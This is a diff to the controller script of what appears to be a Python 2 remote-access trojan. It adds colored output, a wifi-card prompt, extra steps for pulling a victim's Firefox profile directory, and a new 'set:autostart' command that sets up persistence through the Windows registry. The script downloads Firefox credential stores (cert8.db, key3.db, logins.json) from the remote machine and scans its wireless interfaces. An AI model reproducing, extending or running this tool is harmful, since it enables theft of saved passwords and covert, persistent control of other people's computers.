@@ -69,7 +69,7 @@ def SendData(inText):
 def DownloadFILE(fileName):
     fileDOWN = open(fileName, 'wa')
     fileSize = int(RecvData())
-    print ("[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize))
+    print colored.cyan("[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize))
     FSD = 0
     pbar = tqdm(total=fileSize)
     while 1:
@@ -89,7 +89,7 @@ def DownloadFILE(fileName):
 def UploadFILE(fileName):
     fileUP = open(fileName, 'rb')
     fileSize = os.path.getsize(fileName)
-    print ("[>>>]Uploading: %s Bytes: %s" % (fileName, fileSize))
+    print colored.green("[>>>]Uploading: %s Bytes: %s" % (fileName, fileSize))
     FSD = 0
     pbar = tqdm(total=fileSize)
     while 1:
@@ -135,7 +135,7 @@ while True:
                 SendData("get-inferfaces")
                 # retrieve list of wireless card, if present scan else print error and go on
                 print (("%s"+RecvData()+"%s") % (fg(6),attr(0)))
-                card = raw_input("[*] Enter wifi card name: ")
+                card = raw_input("[*] Enter wifi card name (type none for no card): ")
                 if card == "none":
                     print colored.red("ScanWIFI stopped")
                 else:
@@ -175,6 +175,10 @@ while True:
                         newdir = raw_input("[DumpDir] ")
                         SendData(newdir)
                         DownloadFILE("profiles.ini")
+                        profileDir = RecvData()
+                        print (profileDir)
+                        maindir = raw_input("[MainDir] ")
+                        SendData(maindir)
                         print colored.green("[+] Dumping cert8.db, key3.db and logins.json...")
                         DownloadFILE("cert8.db")
                         DownloadFILE("key3.db")
@@ -221,6 +225,19 @@ while True:
                 print ("")
                 outEXEC = RecvData()
                 print (outEXEC)
+            elif inText.startswith("set"):
+                if inText.split(":")[1] == "autostart":
+                    SendData(inText)
+                    plat = RecvData()
+                    if plat == "Windows":
+                        regQuery = RecvData()
+                        print regQuery
+                        regDo = raw_input()
+                        SendData(regDo)
+                        status = RecvData()
+                        print colored.green(status)
+                    else:
+                        print colored.green(plat)
             else:
                 connstream.write(inText)
                 outTT = RecvData()
